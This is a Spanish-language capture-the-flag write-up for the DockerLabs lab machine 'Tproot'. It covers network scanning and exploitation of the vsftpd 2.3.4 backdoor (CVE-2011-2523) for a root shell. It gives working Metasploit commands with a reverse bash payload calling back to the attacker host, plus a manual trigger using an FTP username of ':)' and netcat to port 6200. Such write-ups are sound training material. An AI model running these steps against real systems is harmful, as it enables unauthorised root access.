# Tproot - DockerLabs (Muy Fácil)

**Dificultad:** Muy Fácil  
**Fecha:** 09/2026  
**Sistema:** Linux  
**IP objetivo:** `172.17.0.2`  
**Acceso inicial:** Explotación remota de vsftpd 2.3.4 mediante backdoor (CVE-2011-2523)

## Herramientas

`arp-scan` `Nmap` `Searchsploit` `Metasploit` `FTP` `Netcat`

## Técnicas

`Network Discovery` `Network Enumeration` `Service Version Enumeration` `Vulnerability Identification` `Exploit Research` `Remote Code Execution` `Reverse Shell`

## Introducción

Máquina de la plataforma [Dockerlabs](https://dockerlabs.es/) enfocada en la explotación de una backdoor conocida en vsftpd 2.3.4 (CVE-2011-2523), obteniendo acceso root directo sin necesidad de escalada de privilegios posterior.

- **Dificultad:** Muy Fácil
- **IP objetivo:** 172.17.0.2

## Reconocimiento

### Descubrimiento de host (red Docker)

```
sudo arp-scan -I docker0 --localnet --resolve
```

Confirma la IP del contenedor víctima en la red virtual de Docker (172.17.0.2), sin depender del mensaje que muestra el script de despliegue de Dockerlabs.

### Escaneo de puertos

```
nmap -p- -sV -sC --open -sS -vvv -n -Pn 172.17.0.2
```

Resultado relevante:

```
21/tcp open  ftp     vsftpd 2.3.4
80/tcp open  http    Apache httpd 2.4.58 (Ubuntu)
```

El puerto 21 corre vsftpd 2.3.4, una versión con una vulnerabilidad pública muy conocida.

## Identificación de la vulnerabilidad

Con searchsploit confirmamos que existe un exploit público para esa versión:

```
searchsploit vsftpd
```

```
vsftpd 2.3.4 - Backdoor Command Execution    | unix/remote/17491.rb
```

Corresponde al CVE-2011-2523: en 2011 el código fuente de vsftpd 2.3.4 fue comprometido e infectado con una backdoor intencional. Si te conectás por FTP usando un nombre de usuario que contenga la secuencia :), el servidor abre una shell de comandos como usuario root en el puerto 6200, sin validar ninguna contraseña.

## Explotación

### Con Metasploit

```
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 172.17.0.2
set PAYLOAD cmd/unix/reverse_bash
set LHOST 172.17.0.1
run
```

Nota: la IP de LHOST corresponde a la interfaz docker0 en el atacante. El payload por defecto (meterpreter_reverse_tcp) falló porque requiere que la máquina víctima descargue un binario extra vía HTTP, algo que el contenedor minimalista no soporta. cmd/unix/reverse_bash funciona porque usa una función de red integrada en bash (/dev/tcp), sin dependencias externas.

Resultado:

```
Backdoor has been spawned!
Command shell session 1 opened
```

Confirmación de acceso:

```
whoami
```
Resultado: root

### Alternativa manual (sin Metasploit)

```
ftp 172.17.0.2
Usuario: :)
Contraseña: (cualquiera)
```

Esto dispara la backdoor. En otra terminal:

```
nc 172.17.0.2 6200
```

Y se obtiene directamente una shell con privilegios de administrador del sistema.

## Conclusión

Vulnerabilidad crítica de tipo backdoor intencional en el código fuente, no un fallo de programación. Da acceso total al sistema de forma inmediata, sin pasos de escalada de privilegios. Buen primer ejercicio para entender:
- Flujo completo de reconocimiento, identificación de versión, búsqueda de exploit y explotación
- Selección de payloads de Metasploit según las herramientas disponibles en el objetivo (bash vs curl/wget)
- Diferencia entre red física (Wi-Fi/LAN) y red virtual de Docker (docker0), y su impacto en la configuración de LHOST
